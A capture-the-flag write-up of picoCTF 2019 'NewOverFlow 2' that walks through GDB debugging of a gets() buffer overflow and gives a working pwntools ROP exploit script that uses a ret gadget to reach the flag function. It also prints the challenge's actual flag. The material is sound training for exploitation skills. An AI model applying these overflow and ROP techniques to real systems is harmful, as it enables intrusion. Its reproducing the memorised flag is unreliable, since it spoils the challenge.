# PicoCTF19 NewOverFlow 2

## Challenge

Okay now lets try mainpulating arguments. [program](https://2019shell1.picoctf.com/static/150f9e68253eae5d2425290e440719f1/vuln). You can find it in /problems/newoverflow-2_6 on the shell server. [Source](https://2019shell1.picoctf.com/static/150f9e68253eae5d2425290e440719f1/vuln.c).

## Hints

Arguments aren't stored on the stack anymore ;)

## Solution

Let's take a look at the directory and copy the executable over to my home directory so I can debug it with GDB without any restrictions. Let's also make sure there's a `flag.txt` file with a random flag to tell us when we've solved the problem.

```bash
samson@pico-2019-shell1:/problems/newoverflow-2_6$ ls -al
total 96
drwxr-xr-x   2 root       root             4096 Sep 28 22:03 .
drwxr-x--x 684 root       root            69632 Oct 10 18:02 ..
-r--r-----   1 hacksports newoverflow-2_6    38 Sep 28 22:03 flag.txt
-rwxr-sr-x   1 hacksports newoverflow-2_6  8880 Sep 28 22:03 vuln
-rw-rw-r--   1 hacksports hacksports       1344 Sep 28 22:03 vuln.c
samson@pico-2019-shell1:/problems/newoverflow-2_6$ cp vuln ~ && pushd .
/problems/newoverflow-2_6 /problems/newoverflow-2_6
```

The code for this one is a bit longer.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

bool win1 = false;
bool win2 = false;

void win_fn1(unsigned int arg_check) {
  if (arg_check == 0xDEADBEEF) {
    win1 = true;
  }
}

void win_fn2(unsigned int arg_check1, unsigned int arg_check2, unsigned int arg_check3) {
  if (win1 && arg_check1 == 0xBAADCAFE && arg_check2 == 0xCAFEBABE && arg_check3 == 0xABADBABE) {
    win2 = true;
  }
}

void win_fn() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }
  fgets(flag, sizeof(flag), file);
  if (win1 && win2) {
    printf("%s", flag);
    return;
  }
  else {
    printf("Nope, not quite...\n");
  }
}

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }
  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){
  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Can you match these numbers?");
  vuln();
  return 0;
}
```

Seems like the usual PicoCTF Overflow problems that we are used to. Pass in some input into a buffer and the program exits.

This time however there are three functions, `win_fn1()`, `win_fn2()`, and `win_fn()`.

If we were to follow the execution of the program, we need to pass in `0xDEADBEEF` for `win_fn1()` and `0xBAADCAFE` or `0xCAFEBABE` or `0xABADBABE` to `win_fn2()`.

`win_fn()` seems to print the flag if the arguments are correct and we'd need to somehow provide the arguments in the input buffer. But I'm not sure why that's necessary if we could just jump to flag.


```
samson@pico-2019-shell1:/problems/newoverflow-2_6$ gdb ./vuln
... <redacted>
(gdb) r < <(python -c 'print("A"*64+"B"*4+"C"*4+"D"*4+"E"*4+"F"*4+"G"*4+"H"*4+"I"*4)')
Starting program: /problems/newoverflow-2_6/vuln < <(python -c 'print("A"*64+"B"*4+"C"*4+"D"*4+"E"*4+"F"*4+"G"*4+"H"*4+"I"*4)')
Welcome to 64-bit. Can you match these numbers?

Program received signal SIGSEGV, Segmentation fault.
0x00000000004008cd in vuln ()
(gdb) x/i $pc
=> 0x4008cd <vuln+27>:  retq   
(gdb) disas flag
Dump of assembler code for function flag:
   0x000000000040084d <+0>:     push   %rbp
   0x000000000040084e <+1>:     mov    %rsp,%rbp
   0x0000000000400851 <+4>:     sub    $0x50,%rsp
   0x0000000000400855 <+8>:     lea    0x16c(%rip),%rsi        # 0x4009c8
   0x000000000040085c <+15>:    lea    0x167(%rip),%rdi        # 0x4009ca
   0x0000000000400863 <+22>:    callq  0x400660 <fopen@plt>
   0x0000000000400868 <+27>:    mov    %rax,-0x8(%rbp)
   0x000000000040086c <+31>:    cmpq   $0x0,-0x8(%rbp)
   0x0000000000400871 <+36>:    jne    0x400889 <flag+60>
   0x0000000000400873 <+38>:    lea    0x15e(%rip),%rdi        # 0x4009d8
   0x000000000040087a <+45>:    callq  0x4005f0 <puts@plt>
   0x000000000040087f <+50>:    mov    $0x0,%edi
   0x0000000000400884 <+55>:    callq  0x400670 <exit@plt>
   0x0000000000400889 <+60>:    mov    -0x8(%rbp),%rdx
   0x000000000040088d <+64>:    lea    -0x50(%rbp),%rax
   0x0000000000400891 <+68>:    mov    $0x40,%esi
   0x0000000000400896 <+73>:    mov    %rax,%rdi
   0x0000000000400899 <+76>:    callq  0x400620 <fgets@plt>
   0x000000000040089e <+81>:    lea    -0x50(%rbp),%rax
   0x00000000004008a2 <+85>:    mov    %rax,%rdi
   0x00000000004008a5 <+88>:    mov    $0x0,%eax
   0x00000000004008aa <+93>:    callq  0x400610 <printf@plt>
   0x00000000004008af <+98>:    nop
   0x00000000004008b0 <+99>:    leaveq 
   0x00000000004008b1 <+100>:   retq   
End of assembler dump.
(gdb) info frame
Stack level 0, frame at 0x7fff306a9468:
 rip = 0x4008cd in vuln; saved rip = 0x4545454544444444
 called by frame at 0x7fff306a9478
 Arglist at 0x4343434342424242, args: 
 Locals at 0x4343434342424242, Previous frame's sp is 0x7fff306a9470
 Saved registers:
  rip at 0x7fff306a9468
(gdb) x/10x $sp
0x7fff306a9468: 0x44444444      0x45454545      0x46464646      0x47474747
0x7fff306a9478: 0x48484848      0x49494949      0x306a9500      0x00007fff
0x7fff306a9488: 0x00000000      0x000077b7
(gdb) x/g $sp
0x7fff306a9468: 0x4545454544444444
```

Seems like the return address is stored at the `DDDDEEEE`

This is really similar to the NewOverFlow-1 at this point, let's just reuse the code with a few tweaks. But first let's copy it to our home directory in case of any alignment issues.

```bash
samson@pico-2019-shell1:/problems/newoverflow-2_6$ pushd . && cp vuln ~ && cd ~ && ls -al && cat flag.txt
/problems/newoverflow-2_6 /problems/newoverflow-2_6
total 1164
drwxrwx--T     5 root   samson   4096 Jan 14 03:22 .
drwxr-xr-x 28449 root   root   737280 Jan 14 03:00 ..
-rw-rw----     1 root   samson  13000 Jan 14 03:21 .bash_history
-rw-r--r--     1 samson samson    220 Apr  4  2018 .bash_logout
-rwxr-xr-x     1 root   samson   3689 Dec 27 01:44 .bashrc
drwx------     2 samson samson   4096 Dec 27 01:45 .cache
drwxr-x---     3 samson samson   4096 Dec 28 21:36 .local
-rwxr-xr-x     1 root   samson    807 Apr  4  2018 .profile
drwxr-x---     3 samson samson   4096 Dec 28 22:22 .pwntools-cache
-rw-------     1 samson samson   1428 Jan  6 06:41 .viminfo
-rw-------     1 samson samson 385024 Jan  9 05:21 core
-rw-r-----     1 samson samson     28 Jan  9 05:20 flag.txt
-rwxr-x---     1 samson samson   8880 Jan 14 03:22 vuln
SAMCTF{NOT_THE_ACTUAL_FLAG}
```

Let's use the address of the flag again.

```bash
samson@pico-2019-shell1:~$ gdb ./vuln 
... <redacted>
(gdb) r < <(python -c "print('A'*72+'\x4D\x08\x40'+'\x00'*5)")
Starting program: /home/samson/vuln < <(python -c "print('A'*72+'\x4D\x08\x40'+'\x00'*5)")
Welcome to 64-bit. Can you match these numbers?

Program received signal SIGSEGV, Segmentation fault.
buffered_vfprintf (s=s@entry=0x7ffff7dd0760 <_IO_2_1_stdout_>, format=format@entry=0x7fffffffe418 "SAMCTF{NOT_THE_ACTUAL_FLAG}\n", args=args@entry=0x7fffffffe338) at vfprintf.c:2314
2314    vfprintf.c: No such file or directory.
```

Damn, it's an alignment error, but unlike NewOverflow-1, we can't just increment the adddress by one or a few to be divisble by `16`.

What to do...

```
(gdb) r < <(python -c 'print("A"*64+"B"*4+"C"*4+"D"*4+"E"*4+"F"*4+"G"*4+"H"*4+"I"*4)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/samson/vuln < <(python -c 'print("A"*64+"B"*4+"C"*4+"D"*4+"E"*4+"F"*4+"G"*4+"H"*4+"I"*4)')
Welcome to 64-bit. Can you match these numbers?

Program received signal SIGSEGV, Segmentation fault.
0x00000000004008cd in vuln ()
(gdb) x/i $pc
=> 0x4008cd <vuln+27>:  retq   
(gdb) display/i $pc
1: x/i $pc
=> 0x4008cd <vuln+27>:  retq   
(gdb) b *flag+27


(gdb) r < <(python -c 'print("A"*64+"B"*4+"C"*4+"D"*4+"E"*4+"F"*4+"G"*4+"H"*4+"I"*4)')
Starting program: /home/samson/vuln < <(python -c 'print("A"*64+"B"*4+"C"*4+"D"*4+"E"*4+"F"*4+"G"*4+"H"*4+"I"*4)')
Welcome to 64-bit. Can you match these numbers?

Program received signal SIGSEGV, Segmentation fault.
0x00000000004008cd in vuln ()
1: x/i $pc
=> 0x4008cd <vuln+27>:  retq   
(gdb) f
#0  0x00000000004008cd in vuln ()
(gdb) bt
#0  0x00000000004008cd in vuln ()
#1  0x4545454544444444 in ?? ()
#2  0x4747474746464646 in ?? ()
#3  0x4949494948484848 in ?? ()
#4  0x00007fffffffe500 in ?? ()
#5  0x000077b700000000 in ?? ()
#6  0x0000000000400940 in ?? ()
#7  0x00007ffff7a05b97 in __libc_start_main (main=0x4008ce <main>, argc=1, argv=0x7fffffffe578, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffe568) at ../csu/libc-start.c:310
#8  0x00000000004006aa in _start ()
```


```
DISCLAIMER: I got a hint from my fellow teammates at Maple Bacon that this probably means we want to use [ROP Techniques](https://en.wikipedia.org/wiki/Return-oriented_programming)
```


What if we entered a valid address for the `DDDDEEEE`, and the address of the `flag()` function for `FFFFGGGG`. A return would probably be a good choice as it'll just jump to the next address.

```
(gdb) r < <(python -c 'print("A"*64)')
Starting program: /home/samson/vuln < <(python -c 'print("A"*64)')
Welcome to 64-bit. Can you match these numbers?

Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffe460 in ?? ()
1: x/i $pc
=> 0x7fffffffe460:      add    %ah,%ah
(gdb) info frame
Stack level 0, frame at 0x7fffffffe418:
 rip = 0x7fffffffe460; saved rip = 0x400680
 called by frame at 0x7fffffffe420
 Arglist at 0x7fffffffe408, args: 
 Locals at 0x7fffffffe408, Previous frame's sp is 0x7fffffffe418
 Saved registers:
  rip at 0x7fffffffe410
```

The saved `rip` is at `0x400680`. This isn't divisible by 16 either. Okay. I give up. Let's use `pwntools`.


`exploit.py`
```python
#!/usr/bin/env python
from __future__ import print_function
from pwn import *

p = process('./vuln')
binary_instructions = ELF('./vuln')
ret = binary_instructions.search(asm('ret')).next()
print(p.recvuntil('Welcome to 64-bit. Can you match these numbers?'))
p.sendline('A'*72+p64(ret)+ p64(binary_instructions.symbols['flag']))
print(p.recvall())
```

```bash
samson@pico-2019-shell1:~$ python exploit.py 
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/samson/.pwntools-cache/update to 'never'.
[*] A newer version of pwntools is available on pypi (3.12.2 --> 4.0.0).
    Update with: $ pip install -U pwntools
[+] Starting local process './vuln': pid 2361969
[*] '/home/samson/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
Welcome to 64-bit. Can you match these numbers?
[+] Receiving all data: Done (29B)
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 2361969)

SAMCTF{NOT_THE_ACTUAL_FLAG}
```

It works, let's modify the program to run against the challenge directory.
`p = process('./vuln', cwd='/problems/newoverflow-2_6')`

```bash
samson@pico-2019-shell1:~$ python exploit.py 
[+] Starting local process './vuln': pid 2362033
[*] '/home/samson/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
Welcome to 64-bit. Can you match these numbers?
[+] Receiving all data: Done (39B)
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 2362033)

picoCTF{r0p_1t_d0nT_st0p_1t_535c741c}
```

## Flag

`picoCTF{r0p_1t_d0nT_st0p_1t_535c741c}`